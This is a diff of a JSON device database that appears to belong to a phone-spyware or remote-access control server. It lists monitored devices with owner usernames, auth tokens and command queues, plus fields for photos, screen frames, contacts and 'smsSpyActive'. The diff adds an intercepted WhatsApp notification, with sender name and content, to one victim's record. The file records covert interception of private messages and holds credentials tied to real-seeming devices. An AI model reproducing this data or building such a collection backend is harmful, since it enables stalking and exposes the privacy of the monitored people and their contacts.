@@ -7578,7 +7578,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776766834091,
+    "lastSeen": 1776766838878,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -7610,7 +7610,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776766836205,
+    "lastSeen": 1776766837071,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -7625,7 +7625,16 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Gopit Dki",
+        "content": "Menyukai status Anda",
+        "time": "21/04 17:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776766839173
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
